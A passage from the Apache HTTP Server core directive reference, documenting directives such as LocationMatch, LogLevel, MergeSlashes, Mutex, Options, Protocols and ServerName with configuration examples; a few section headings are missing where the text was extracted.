would match URLs that contained the substring `/extra/data`
or `/special/data`. The directive `[<LocationMatch>](#locationmatch)` behaves
identical to the regex version of `<Location>`, and is preferred, for the
simple reason that `~` is hard to distinguish from
`-` in many fonts.

The `<Location>`
functionality is especially useful when combined with the
`[SetHandler](#sethandler)`
directive. For example, to enable status requests but allow them
only from browsers at `example.com`, you might use:

```
<Location "/status">
  SetHandler server-status
  Require host example.com
</Location>
```
### Note about / (slash)

The slash character has special meaning depending on where in a
URL it appears. People may be used to its behavior in the filesystem
where multiple adjacent slashes are frequently collapsed to a single
slash (*i.e.*, `/home///foo` is the same as
`/home/foo`). In URL-space this is not necessarily true if
directive `[MergeSlashes](#mergeslashes)` has been set
to "OFF".
The `[<LocationMatch>](#locationmatch)`
directive and the regex version of `<Location>` require you to explicitly specify multiple
slashes if the slashes are not being merged.

For example, `<LocationMatch "^/abc">` would match
the request URL `/abc` but not the request URL `//abc`. The (non-regex) `<Location>` directive behaves similarly when used for
proxy requests. But when (non-regex) `<Location>` is used for non-proxy requests it will
implicitly match multiple slashes with a single slash. For example,
if you specify `<Location "/abc/def">` and the
request is to `/abc//def` then it will match.

  and <Files> sections work](../sections.html) for an explanation of how these
  different sections are combined when a request is received.

## <LocationMatch> Directive

| [Description:](directive-dict.html#Description) | Applies the enclosed directives only to regular-expression matching URLs |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `<LocationMatch regex> ... </LocationMatch>` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `<LocationMatch>` directive
limits the scope of the enclosed directives by URL, in an identical manner
to `[<Location>](#location)`. However,
it takes a [regular expression](../glossary.html#regex "see glossary")
as an argument instead of a simple string. For example:

```
<LocationMatch "/(extra|special)/data">
    # ...
</LocationMatch>
```

would match URLs that contained the substring `/extra/data`
or `/special/data`.

If the intent is that a URL **starts with**
`/extra/data`, rather than merely
**contains** `/extra/data`, prefix the
regular expression with a `^` to require this.

```
<LocationMatch "^/(extra|special)/data">
```

From 2.4.8 onwards, named groups and backreferences are captured and
written to the environment with the corresponding name prefixed with
"MATCH\_" and in upper case. This allows elements of URLs to be referenced
from within [expressions](../expr.html) and modules like
`[mod_rewrite](../mod/mod_rewrite.html)`. In order to prevent confusion, numbered
(unnamed) backreferences are ignored. Use named groups instead.

```
<LocationMatch "^/combined/(?<sitename>[^/]+)">
    Require ldap-group cn=%{env:MATCH_SITENAME},ou=combined,o=Example
</LocationMatch>
```
### Note about / (slash)

The slash character has special meaning depending on where in a
URL it appears. People may be used to its behavior in the filesystem
where multiple adjacent slashes are frequently collapsed to a single
slash (*i.e.*, `/home///foo` is the same as
`/home/foo`). In URL-space this is not necessarily true if
directive `[MergeSlashes](#mergeslashes)` has been set
to "OFF".
The `[<LocationMatch>](#locationmatch)`
directive and the regex version of `<Location>` require you to explicitly specify multiple
slashes if the slashes are not being merged.

For example, `<LocationMatch "^/abc">` would match
the request URL `/abc` but not the request URL `//abc`. The (non-regex) `<Location>` directive behaves similarly when used for
proxy requests. But when (non-regex) `<Location>` is used for non-proxy requests it will
implicitly match multiple slashes with a single slash. For example,
if you specify `<Location "/abc/def">` and the
request is to `/abc//def` then it will match.

## LogLevel Directive

| [Description:](directive-dict.html#Description) | Controls the verbosity of the ErrorLog |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `LogLevel [module:]level [module:level] ...` |
| [Default:](directive-dict.html#Default) | `LogLevel warn` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Per-module and per-directory configuration is available in Apache HTTP Server 2.3.6 and later |

`LogLevel` adjusts the verbosity of the
messages recorded in the error logs (see `[ErrorLog](#errorlog)` directive). The following
levels are available, in order of decreasing
significance:

| **Level** | **Description** | **Example** |
| --- | --- | --- |
| `emerg` | Emergencies - system is unusable. | "Child cannot open lock file. Exiting" |
| `alert` | Action must be taken immediately. | "getpwuid: couldn't determine user name from uid" |
| `crit` | Critical Conditions. | "socket: Failed to get a socket, exiting child" |
| `error` | Error conditions. | "Premature end of script headers" |
| `warn` | Warning conditions. | "child process 1234 did not exit, sending another SIGHUP" |
| `notice` | Normal but significant condition. | "httpd: caught SIGBUS, attempting to dump core in ..." |
| `info` | Informational. | "Server seems busy, (you may need to increase StartServers, or Min/MaxSpareServers)..." |
| `debug` | Debug-level messages | "Opening config file ..." |
| `trace1` | Trace messages | "proxy: FTP: control connection complete" |
| `trace2` | Trace messages | "proxy: CONNECT: sending the CONNECT request to the remote proxy" |
| `trace3` | Trace messages | "openssl: Handshake: start" |
| `trace4` | Trace messages | "read from buffered SSL brigade, mode 0, 17 bytes" |
| `trace5` | Trace messages | "map lookup FAILED: map=rewritemap key=keyname" |
| `trace6` | Trace messages | "cache lookup FAILED, forcing new map lookup" |
| `trace7` | Trace messages, dumping large amounts of data | "| 0000: 02 23 44 30 13 40 ac 34 df 3d bf 9a 19 49 39 15 |" |
| `trace8` | Trace messages, dumping large amounts of data | "| 0000: 02 23 44 30 13 40 ac 34 df 3d bf 9a 19 49 39 15 |" |

When a particular level is specified, messages from all
other levels of higher significance will be reported as well.
*E.g.*, when `LogLevel info` is specified,
then messages with log levels of `notice` and
`warn` will also be posted.

Using a level of at least `crit` is
recommended.

For example:

```
LogLevel notice
```
### Note

When logging to a regular file, messages of the level
`notice` cannot be suppressed and thus are always
logged. However, this doesn't apply when logging is done
using `syslog`.

Specifying a level without a module name will reset the level
for all modules to that level. Specifying a level with a module
name will set the level for that module only. It is possible to
use the module source file name, the module identifier, or the
module identifier with the trailing `_module` omitted
as module specification. This means the following three specifications
are equivalent:

```
LogLevel info ssl:warn
LogLevel info mod_ssl.c:warn
LogLevel info ssl_module:warn
```

It is also possible to change the level per directory:

```
LogLevel info
<Directory "/usr/local/apache/htdocs/app">
  LogLevel debug
</Directory>
```
Per directory loglevel configuration only affects messages that are
logged after the request has been parsed and that are associated with
the request. Log messages which are associated with the connection or
the server are not affected.

| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `MaxKeepAliveRequests` directive
limits the number of requests allowed per connection when
`[KeepAlive](#keepalive)` is on. If it is
set to `0`, unlimited requests will be allowed. We
recommend that this setting be kept to a high value for maximum
server performance.

For example:

```
MaxKeepAliveRequests 500
```

## MergeSlashes Directive

| [Description:](directive-dict.html#Description) | Controls whether the server merges consecutive slashes in URLs. |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `MergeSlashes ON|OFF` |
| [Default:](directive-dict.html#Default) | `MergeSlashes ON` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Added in 2.4.39 |

By default, the server merges (or collapses) multiple consecutive slash
('/') characters in the path component of the request URL.

When mapping URL's to the filesystem, these multiple slashes are not
significant. However, URL's handled other ways, such as by CGI or proxy,
might prefer to retain the significance of multiple consecutive slashes.
In these cases `MergeSlashes` can be set to
*OFF* to retain the multiple consecutive slashes, which is the legacy behavior.

When set to "OFF", regular expressions used in the configuration file that match
the path component of the URL (`LocationMatch`,
`RewriteRule`, ...) need to take into account multiple
consecutive slashes. Non regular expression based `Location` always
operate against a URL with merged slashes and cannot differentiate between multiple slashes.

## MergeTrailers Directive

| [Description:](directive-dict.html#Description) | Determines whether trailers are merged into headers |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `MergeTrailers [on|off]` |
| [Default:](directive-dict.html#Default) | `MergeTrailers off` |

| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | 2.4.11 and later |

This directive controls whether HTTP trailers are copied into the
internal representation of HTTP headers. This merging occurs when the
request body has been completely consumed, long after most header
processing would have a chance to examine or modify request headers.

This option is provided for compatibility with releases prior to 2.4.11,
where trailers were always merged.

## Mutex Directive

| [Description:](directive-dict.html#Description) | Configures mutex mechanism and lock file directory for all or specified mutexes |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `Mutex mechanism [default|mutex-name] ... [OmitPID]` |
| [Default:](directive-dict.html#Default) | `Mutex default` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in Apache HTTP Server 2.3.4 and later |

The `Mutex` directive sets the mechanism,
and optionally the lock file location, that httpd and modules use
to serialize access to resources. Specify `default` as
the second argument to change the settings for all mutexes; specify
a mutex name (see table below) as the second argument to override
defaults only for that mutex.

The `Mutex` directive is typically used in
the following exceptional situations:

* change the mutex mechanism when the default mechanism selected
  by [APR](../glossary.html#apr "see glossary") has a functional or performance
  problem
* change the directory used by file-based mutexes when the
  default directory does not support locking

### Supported modules

This directive only configures mutexes which have been registered
with the core server using the `ap_mutex_register()` API.
All modules bundled with httpd support the `Mutex`
directive, but third-party modules may not. Consult the documentation
of the third-party module, which must indicate the mutex name(s) which
can be configured if this directive is supported.

The following mutex *mechanisms* are available:

* `default | yes`

  This selects the default locking implementation, as determined by
  [APR](../glossary.html#apr "see glossary"). The default locking implementation can
  be displayed by running `[httpd](../programs/httpd.html)` with the
  `-V` option.
* `none | no`

  This effectively disables the mutex, and is only allowed for a
  mutex if the module indicates that it is a valid choice. Consult the
  module documentation for more information.
* `posixsem`

  This is a mutex variant based on a Posix semaphore.

  ### Warning

  The semaphore ownership is not recovered if a thread in the process
  holding the mutex segfaults, resulting in a hang of the web server.
* `sysvsem`

  This is a mutex variant based on a SystemV IPC semaphore.

  ### Warning

  It is possible to "leak" SysV semaphores if processes crash
  before the semaphore is removed.

  ### Security

  The semaphore API allows for a denial of service attack by any
  CGIs running under the same uid as the webserver (*i.e.*,
  all CGIs, unless you use something like `[suexec](../programs/suexec.html)`
  or `cgiwrapper`).
* `sem`

  This selects the "best" available semaphore implementation, choosing
  between Posix and SystemV IPC semaphores, in that order.
* `pthread`

  This is a mutex variant based on cross-process Posix thread
  mutexes.

  ### Warning

  On most systems, if a child process terminates abnormally while
  holding a mutex that uses this implementation, the server will deadlock
  and stop responding to requests. When this occurs, the server will
  require a manual restart to recover.

  Solaris and Linux are notable exceptions as they provide a mechanism which
  usually allows the mutex to be recovered after a child process
  terminates abnormally while holding a mutex.

  If your system is POSIX compliant or if it implements the
  `pthread_mutexattr_setrobust_np()` function, you may be able
  to use the `pthread` option safely.
* `fcntl:/path/to/mutex`

  This is a mutex variant where a physical (lock-)file and the
  `fcntl()` function are used as the mutex.

  ### Warning

  When multiple mutexes based on this mechanism are used within
  multi-threaded, multi-process environments, deadlock errors (EDEADLK)
  can be reported for valid mutex operations if `fcntl()`
  is not thread-aware, such as on Solaris.
* `flock:/path/to/mutex`

  This is similar to the `fcntl:/path/to/mutex` method
  with the exception that the `flock()` function is used to
  provide file locking.
* `file:/path/to/mutex`

  This selects the "best" available file locking implementation,
  choosing between `fcntl` and `flock`, in that
  order.

Most mechanisms are only available on selected platforms, where the
underlying platform and [APR](../glossary.html#apr "see glossary") support it. Mechanisms
which aren't available on all platforms are *posixsem*,
*sysvsem*, *sem*, *pthread*, *fcntl*,
*flock*, and *file*.

With the file-based mechanisms *fcntl* and *flock*,
the path, if provided, is a directory where the lock file will be created.
The default directory is httpd's run-time file directory relative to
`[ServerRoot](#serverroot)`. Always use a local disk
filesystem for `/path/to/mutex` and never a directory residing
on a NFS- or AFS-filesystem. The basename of the file will be the mutex
type, an optional instance string provided by the module, and unless the
`OmitPID` keyword is specified, the process id of the httpd
parent process will be appended to make the file name unique, avoiding
conflicts when multiple httpd instances share a lock file directory. For
example, if the mutex name is `mpm-accept` and the lock file
directory is `/var/httpd/locks`, the lock file name for the
httpd instance with parent process id 12345 would be
`/var/httpd/locks/mpm-accept.12345`.

### Security

It is best to *avoid* putting mutex files in a world-writable
directory such as `/var/tmp` because someone could create
a denial of service attack and prevent the server from starting by
creating a lockfile with the same name as the one the server will try
to create.

The following table documents the names of mutexes used by httpd
and bundled modules.

| Mutex name | Module(s) | Protected resource |
| --- | --- | --- |
| `mpm-accept` | `[prefork](../mod/prefork.html)` and `[worker](../mod/worker.html)` MPMs | incoming connections, to avoid the thundering herd problem; for more information, refer to the [performance tuning](../misc/perf-tuning.html) documentation |
| `authdigest-client` | `[mod_auth_digest](../mod/mod_auth_digest.html)` | client list in shared memory |
| `authdigest-opaque` | `[mod_auth_digest](../mod/mod_auth_digest.html)` | counter in shared memory |
| `ldap-cache` | `[mod_ldap](../mod/mod_ldap.html)` | LDAP result cache |
| `rewrite-map` | `[mod_rewrite](../mod/mod_rewrite.html)` | communication with external mapping programs, to avoid intermixed I/O from multiple requests |
| `ssl-cache` | `[mod_ssl](../mod/mod_ssl.html)` | SSL session cache |
| `ssl-stapling` | `[mod_ssl](../mod/mod_ssl.html)` | OCSP stapling response cache |
| `watchdog-callback` | `[mod_watchdog](../mod/mod_watchdog.html)` | callback function of a particular client module |

The `OmitPID` keyword suppresses the addition of the httpd
parent process id from the lock file name.

In the following example, the mutex mechanism for the MPM accept
mutex will be changed from the compiled-in default to `fcntl`,
with the associated lock file created in directory
`/var/httpd/locks`. The mutex mechanism for all other mutexes
will be changed from the compiled-in default to `sysvsem`.

```
Mutex sysvsem default
Mutex fcntl:/var/httpd/locks mpm-accept
```

## NameVirtualHost Directive

| [Description:](directive-dict.html#Description) | DEPRECATED: Designates an IP address for name-virtual hosting |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `NameVirtualHost addr[:port]` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

Prior to 2.3.11, `NameVirtualHost` was required
to instruct the server that a particular IP address and port combination
was usable as a name-based virtual host. In 2.3.11 and later,
any time an IP address and port combination is used in multiple virtual
hosts, name-based virtual hosting is automatically enabled for that address.

This directive currently has no effect.

## Options Directive

| [Description:](directive-dict.html#Description) | Configures what features are available in a particular directory |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `Options [+|-]option [[+|-]option] ...` |
| [Default:](directive-dict.html#Default) | `Options FollowSymlinks` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | Options |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | The default was changed from All to FollowSymlinks in 2.3.11 |

The `Options` directive controls which
server features are available in a particular directory.

option can be set to `None`, in which
case none of the extra features are enabled, or one or more of
the following:

`All`
All options except for `MultiViews`.
`ExecCGI`
Execution of CGI scripts using `[mod_cgi](../mod/mod_cgi.html)`
is permitted.
`FollowSymLinks`
The server will follow symbolic links in this directory. This is
the default setting.

Even though the server follows the symlink it does *not*
change the pathname used to match against `[<Directory>](#directory)` sections.

The `FollowSymLinks` and
`SymLinksIfOwnerMatch` `[Options](#options)` work only in `[<Directory>](#directory)` sections or
`.htaccess` files.

Omitting this option should not be considered a security restriction,
since symlink testing is subject to race conditions that make it
circumventable.

`Includes`
Server-side includes provided by `[mod_include](../mod/mod_include.html)`
are permitted.
`IncludesNOEXEC`
Server-side includes are permitted, but the `#exec
cmd` and `#exec cgi` are disabled. It is still
possible to `#include virtual` CGI scripts from
`[ScriptAlias](../mod/mod_alias.html#scriptalias)`ed
directories.
`Indexes`
If a URL which maps to a directory is requested and there
is no `[DirectoryIndex](../mod/mod_dir.html#directoryindex)`
(*e.g.*, `index.html`) in that directory, then
`[mod_autoindex](../mod/mod_autoindex.html)` will return a formatted listing
of the directory.
`MultiViews`
[Content negotiated](../content-negotiation.html)
"MultiViews" are allowed using
`[mod_negotiation](../mod/mod_negotiation.html)`.
### Note

This option gets ignored if set
anywhere other than `[<Directory>](#directory)`, as `[mod_negotiation](../mod/mod_negotiation.html)`
needs real resources to compare against and evaluate from.

`SymLinksIfOwnerMatch`
The server will only follow symbolic links for which the
target file or directory is owned by the same user id as the
link.
### Note

The `FollowSymLinks` and
`SymLinksIfOwnerMatch` `[Options](#options)` work only in `[<Directory>](#directory)` sections or
`.htaccess` files.

This option should not be considered a security restriction,
since symlink testing is subject to race conditions that make it
circumventable.

Normally, if multiple `Options` could
apply to a directory, then the most specific one is used and
others are ignored; the options are not merged. (See [how sections are merged](../sections.html#merging).)
However if *all* the options on the
`Options` directive are preceded by a
`+` or `-` symbol, the options are
merged. Any options preceded by a `+` are added to the
options currently in force, and any options preceded by a
`-` are removed from the options currently in
force.

### Note

Mixing `Options` with a `+` or
`-` with those without is not valid syntax and will be
rejected during server startup by the syntax check with an abort.

For example, without any `+` and `-` symbols:

```
<Directory "/web/docs">
  Options Indexes FollowSymLinks
</Directory>

<Directory "/web/docs/spec">
  Options Includes
</Directory>
```

then only `Includes` will be set for the
`/web/docs/spec` directory. However if the second
`Options` directive uses the `+` and
`-` symbols:

```
<Directory "/web/docs">
  Options Indexes FollowSymLinks
</Directory>

<Directory "/web/docs/spec">
  Options +Includes -Indexes
</Directory>
```

then the options `FollowSymLinks` and
`Includes` are set for the `/web/docs/spec`
directory.

### Note

Using `-IncludesNOEXEC` or
`-Includes` disables server-side includes completely
regardless of the previous setting.

The default in the absence of any other settings is
`FollowSymlinks`.

## Protocol Directive

| [Description:](directive-dict.html#Description) | Protocol for a listening socket |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `Protocol protocol` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in Apache 2.1.5 and later. On Windows, from Apache 2.3.3 and later. |

This directive specifies the protocol used for a specific listening socket.
The protocol is used to determine which module should handle a request and
to apply protocol specific optimizations with the `AcceptFilter`
directive.

This directive not required for most
configurations. If not specified, `https` is the default for
port 443 and `http` the default for all other ports. The
protocol is used to determine which module should handle a request, and
to apply protocol specific optimizations with the
`[AcceptFilter](#acceptfilter)` directive.

For example, if you are running `https` on a non-standard port,
specify the protocol explicitly:

```
Protocol https
```

You can also specify the protocol using the `[Listen](../mod/mpm_common.html#listen)` directive.

## Protocols Directive

| [Description:](directive-dict.html#Description) | Protocols available for a server/virtual host |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `Protocols protocol ...` |
| [Default:](directive-dict.html#Default) | `Protocols http/1.1` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Only available from Apache 2.4.17 and later. |

This directive specifies the list of protocols supported for a
server/virtual host. The list determines the allowed protocols
a client may negotiate for this server/host.

You need to set protocols if you want to extend the available
protocols for a server/host. By default, only the http/1.1 protocol
(which includes the compatibility with 1.0 and 0.9 clients) is
allowed.

For example, if you want to support HTTP/2 for a server with TLS,
specify:

```
Protocols h2 http/1.1
```

Valid protocols are `http/1.1` for http and https connections,
`h2` on https connections and `h2c` for http
connections. Modules may enable more protocols.

It is safe to specify protocols that are unavailable/disabled. Such
protocol names will simply be ignored.

Protocols specified in base servers are inherited for virtual hosts
only if the virtual host has no own Protocols directive. Or, the other
way around, Protocols directives in virtual hosts replace any
such directive in the base server.

| [Compatibility:](directive-dict.html#Compatibility) | Only available from Apache 2.4.17 and later. |

This directive specifies if the server should honor the order in which
the `Protocols` directive lists protocols.

If configured Off, the client supplied list order of protocols has
precedence over the order in the server configuration.

With `ProtocolsHonorOrder` set to `on`
(default), the client ordering does not matter and only the ordering
in the server settings influences the outcome of the protocol
negotiation.

| [Compatibility:](directive-dict.html#Compatibility) | Directive supported in 2.4.18 and later. 2.4.17 acted as if 'QualifyRedirectURL On' was configured. |

This directive controls whether the server will ensure that the
REDIRECT\_URL environment variable is fully qualified. By default,
the variable contains the verbatim URL requested by the client,
such as "/index.html". With `QualifyRedirectURL On`, the same request would result in a
value such as "http://www.example.com/index.html".

Even without this directive set, when a request is issued against a
fully qualified URL, REDIRECT\_URL will remain fully qualified.

## ReadBufferSize Directive

| [Description:](directive-dict.html#Description) | Size of the buffers used to read data |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ReadBufferSize bytes` |
| [Default:](directive-dict.html#Default) | `ReadBufferSize 8192` |

| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | 2.4.27 and later |

This directive allows to configure the size (in bytes) of the memory
buffer used to read data from the network or files.

A larger buffer can increase peformances with larger data, but consumes
more memory per connection. The minimum configurable size is
1024.

## RegexDefaultOptions Directive

| [Description:](directive-dict.html#Description) | Allow to configure global/default options for regexes |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `RegexDefaultOptions [none] [+|-]option [[+|-]option] ...` |
| [Default:](directive-dict.html#Default) | `RegexDefaultOptions DOTALL DOLLAR_ENDONLY` |

| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Only available from Apache 2.4.30 and later. |

This directive adds some default behavior to ANY regular expression
used afterwards.

Any option preceded by a '+' is added to the already set options.

Any option preceded by a '-' is removed from the already set options.

Any option without a '+' or a '-' will be set, removing any other
already set option.

The `none` keyword resets any already set options.

option can be:

`ICASE`
Use a case-insensitive match.
`EXTENDED`
Perl's /x flag, ignore (unescaped-)spaces and comments in the pattern.
`DOTALL`
Perl's /s flag, '.' matches newline characters.
`DOLLAR_ENDONLY`
'$' matches at end of subject string only.
```
# Add the ICASE option for all regexes by default
RegexDefaultOptions +ICASE
...
# Remove the default DOLLAR_ENDONLY option, but keep any other one
RegexDefaultOptions -DOLLAR_ENDONLY
...
# Set the DOTALL option only, resetting any other one
RegexDefaultOptions DOTALL
...
# Reset all defined options
RegexDefaultOptions none
...

## RegisterHttpMethod Directive

| [Description:](directive-dict.html#Description) | Register non-standard HTTP methods |

| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in Apache HTTP Server 2.4.24 and later |

This directive may be used to register additional HTTP methods. This is
necessary if non-standard methods need to be used with directives that accept
method names as parameters, or to allow particular non-standard methods to be
used via proxy or CGI script when the server has been configured to only pass
recognized methods to modules.

| [Override:](directive-dict.html#Override) | All |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

Takes 1 or 2 parameters. The first parameter sets the soft
resource limit for all processes and the second parameter sets
the maximum resource limit. Either parameter can be a number,
or `max` to indicate to the server that the limit should
be set to the maximum allowed by the operating system
configuration. Raising the maximum resource limit requires that
the server is running as `root` or in the initial startup
phase.

This applies to processes forked from Apache httpd children
servicing requests, not the Apache httpd children themselves. This
includes CGI scripts and SSI exec commands, but not any
processes forked from the Apache httpd parent, such as piped
logs.

CPU resource limits are expressed in seconds per
process.

Process limits control the number of processes per user.

### Note

If CGI processes are **not** running
under user ids other than the web server user id, this directive
will limit the number of processes that the server itself can
create. Evidence of this situation will be indicated by
**`cannot fork`** messages in the
`error_log`.

## ScriptInterpreterSource Directive

| [Description:](directive-dict.html#Description) | Technique for locating the interpreter for CGI scripts |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ScriptInterpreterSource Registry|Registry-Strict|Script` |
| [Default:](directive-dict.html#Default) | `ScriptInterpreterSource Script` |
| [Context:](directive-dict.html#Context) | server config, virtual host, directory, .htaccess |
| [Override:](directive-dict.html#Override) | FileInfo |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Win32 only. |

This directive is used to control how Apache httpd finds the
interpreter used to run CGI scripts. The default setting is
`Script`. This causes Apache httpd to use the interpreter pointed to
by the shebang line (first line, starting with `#!`) in the
script. On Win32 systems this line usually looks like:

```
#!C:/Perl/bin/perl.exe
```

or, if `perl` is in the `PATH`, simply:

```
#!perl
```

Setting `ScriptInterpreterSource Registry` will
cause the Windows Registry tree `HKEY_CLASSES_ROOT` to be
searched using the script file extension (e.g., `.pl`) as a
search key. The command defined by the registry subkey
`Shell\ExecCGI\Command` or, if it does not exist, by the subkey
`Shell\Open\Command` is used to open the script file. If the
registry keys cannot be found, Apache httpd falls back to the behavior of the
`Script` option.

### Security

Be careful when using `ScriptInterpreterSource
Registry` with `[ScriptAlias](../mod/mod_alias.html#scriptalias)`'ed directories, because
Apache httpd will try to execute **every** file within this
directory. The `Registry` setting may cause undesired
program calls on files which are typically not executed. For
example, the default open command on `.htm` files on
most Windows systems will execute Microsoft Internet Explorer, so
any HTTP request for an `.htm` file existing within the
script directory would start the browser in the background on the
server. This is a good way to crash your system within a minute or
so.

The option `Registry-Strict`
does the same thing as `Registry` but uses only the
subkey `Shell\ExecCGI\Command`. The
`ExecCGI` key is not a common one. It must be
configured manually in the windows registry and hence prevents
accidental program calls on your system.

## SeeRequestTail Directive

| [Description:](directive-dict.html#Description) | Determine if mod\_status displays the first 63 characters of a request or the last 63, assuming the request itself is greater than 63 chars. |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `SeeRequestTail On|Off` |
| [Default:](directive-dict.html#Default) | `SeeRequestTail Off` |
| [Context:](directive-dict.html#Context) | server config |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |
| [Compatibility:](directive-dict.html#Compatibility) | Available in Apache httpd 2.2.7 and later. |

`[mod_status](../mod/mod_status.html)` with `ExtendedStatus On`
displays the actual request being handled.
For historical purposes, only 63 characters of the request
are actually stored for display purposes. This directive
controls whether the first 63 characters are stored (the previous
behavior and the default) or if the last 63 characters are. This
is only applicable, of course, if the length of the request is
64 characters or greater.

If Apache httpd is handling `GET /disk1/storage/apache/htdocs/images/imagestore1/food/apples.jpg HTTP/1.1` `[mod_status](../mod/mod_status.html)` displays as follows:

| Off (default) | GET /disk1/storage/apache/htdocs/images/imagestore1/food/apples |
| --- | --- |
| On | orage/apache/htdocs/images/imagestore1/food/apples.jpg HTTP/1.1 |

## ServerAdmin Directive

| [Description:](directive-dict.html#Description) | Email address that the server includes in error messages sent to the client |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ServerAdmin email-address|URL` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `ServerAdmin` sets the contact address
that the server includes in any error messages it returns to the
client. If the `httpd` doesn't recognize the supplied argument
as an URL, it
assumes, that it's an email-address and prepends it with
`mailto:` in hyperlink targets. However, it's recommended to
actually use an email address, since there are a lot of CGI scripts that
make that assumption. If you want to use an URL, it should point to another
server under your control. Otherwise users may not be able to contact you in
case of errors.

It may be worth setting up a dedicated address for this, e.g.

```
ServerAdmin www-admin@foo.example.com
```

as users do not always mention that they are talking about the
server!

[![top](../images/up.gif)](#page-header)
## ServerAlias Directive

| [Description:](directive-dict.html#Description) | Alternate names for a host used when matching requests to name-virtual hosts |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ServerAlias hostname [hostname] ...` |
| [Context:](directive-dict.html#Context) | virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `ServerAlias` directive sets the
alternate names for a host, for use with [name-based virtual hosts](../vhosts/name-based.html). The
`ServerAlias` may include wildcards, if appropriate.

```
<VirtualHost *:80>
  ServerName server.example.com
  ServerAlias server server2.example.com server2
  ServerAlias *.example.com
  UseCanonicalName Off
  # ...
</VirtualHost>
```

Name-based virtual hosts for the best-matching set of `[<virtualhost>](#virtualhost)`s are processed
in the order they appear in the configuration. The first matching `[ServerName](#servername)` or `[ServerAlias](#serveralias)` is used, with no different precedence for wildcards
(nor for ServerName vs. ServerAlias).

The complete list of names in the `[<VirtualHost>](#virtualhost)`
directive are treated just like a (non wildcard)
`ServerAlias`.

[![top](../images/up.gif)](#page-header)
## ServerName Directive

| [Description:](directive-dict.html#Description) | Hostname and port that the server uses to identify itself |
| --- | --- |
| [Syntax:](directive-dict.html#Syntax) | `ServerName [scheme://]domain-name|ip-address[:port]` |
| [Context:](directive-dict.html#Context) | server config, virtual host |
| [Status:](directive-dict.html#Status) | Core |
| [Module:](directive-dict.html#Module) | core |

The `ServerName` directive sets the
request scheme, hostname and port that the server uses to identify itself.

`ServerName` is used (possibly
in conjunction with `[ServerAlias](#serveralias)`) to uniquely
identify a virtual host, when using [name-based virtual hosts](../vhosts/name-based.html).

Additionally, this is used when
creating self-referential redirection URLs when
`[UseCanonicalName](#usecanonicalname)` is set to a non-default
value.

For example, if the name of the
machine hosting the web server is `simple.example.com`,
but the machine also has the DNS alias `www.example.com`
and you wish the web server to be so identified, the following
directive should be used:

```
ServerName www.example.com
```

The `ServerName` directive
may appear anywhere within the definition of a server. However,
each appearance overrides the previous appearance (within that
server).

If no `ServerName` is specified, the
server attempts to deduce the client visible hostname by first asking
the operating system for the system hostname, and if that fails,
performing a reverse lookup on an IP address present on the system.

If no port is specified in the
`ServerName`, then the server will use the
port from the incoming request. For optimal reliability and
predictability, you should specify an explicit hostname and port
using the `ServerName` directive.

If you are using [name-based virtual hosts](../vhosts/name-based.html),
the `ServerName` inside a
`[<VirtualHost>](#virtualhost)`
section specifies what hostname must appear in the request's
`Host:` header to match this virtual host.

Sometimes, the server runs behind a device that processes SSL,
such as a reverse proxy, load balancer or SSL offload
appliance. When this is the case, specify the
`https://` scheme and the port number to which the
clients connect in the `ServerName` directive
to make sure that the server generates the correct
